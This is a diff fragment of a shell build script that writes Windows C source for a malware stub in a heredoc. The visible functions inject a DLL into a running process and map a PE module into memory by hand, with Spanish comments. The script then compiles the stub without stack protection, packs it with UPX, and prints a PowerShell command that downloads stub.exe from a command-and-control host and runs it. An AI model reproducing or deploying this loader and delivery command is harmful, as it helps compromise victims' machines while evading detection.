@@ -800,6 +800,7 @@ BOOL InjectDLLToProcess(DWORD pid, unsigned char* dllBuffer, DWORD dllSize) {
     CloseHandle(hProcess);
     return TRUE;
 }
+
 DWORD GetProcessIdByName(const char* processName) {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
@@ -833,6 +834,7 @@ void ExecuteTLSCallbacks(PVOID moduleBase) {
         callbacks[i](moduleBase, DLL_PROCESS_ATTACH, NULL);
     }
 }
+
 // === Carga un módulo en memoria ===
 PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileBuffer;
@@ -888,14 +890,14 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
 
         for (; importDesc->Name; importDesc++) {
             char* dllName = (char*)((BYTE*)baseAddress + importDesc->Name);
-            printf("[I] Cargando DLL: %s\n", dllName);  // Log para depuración
+            printf("[I] Cargando DLL: %s\n", dllName);
             fflush(stdout);
 
-            HMODULE hDll = MapDllNameToModule(dllName);  // ✅ Usa la función auxiliar
+            HMODULE hDll = MapDllNameToModule(dllName);
             if (!hDll) {
                 printf("[-] No se pudo cargar: %s\n", dllName);
                 fflush(stdout);
-                VirtualFree(baseAddress, 0, MEM_RELEASE);  // ✅ baseAddress está definido
+                VirtualFree(baseAddress, 0, MEM_RELEASE);
                 return NULL;
             }
 
@@ -919,7 +921,7 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
         }
     }
 
-    return baseAddress;  // ✅ Retorna baseAddress
+    return baseAddress;
 }
 
 // === Ejecuta el módulo (DllMain o EntryPoint) ===
@@ -5771,7 +5773,5 @@ int main() {
     return exec_ok ? 0 : 1;
 }
 EOF
-
 x86_64-w64-mingw32-gcc -o stub.exe stub.c -lwininet -ladvapi32 -s -Os -static -fno-stack-protector -lcrypt32 && upx --best --ultra-brute  stub.exe
-
 echo "powershell -c \"Invoke-WebRequest 'http://$C2_HOST/stub.exe' -OutFile 'stub.exe'; Start-Process 'stub.exe'\""
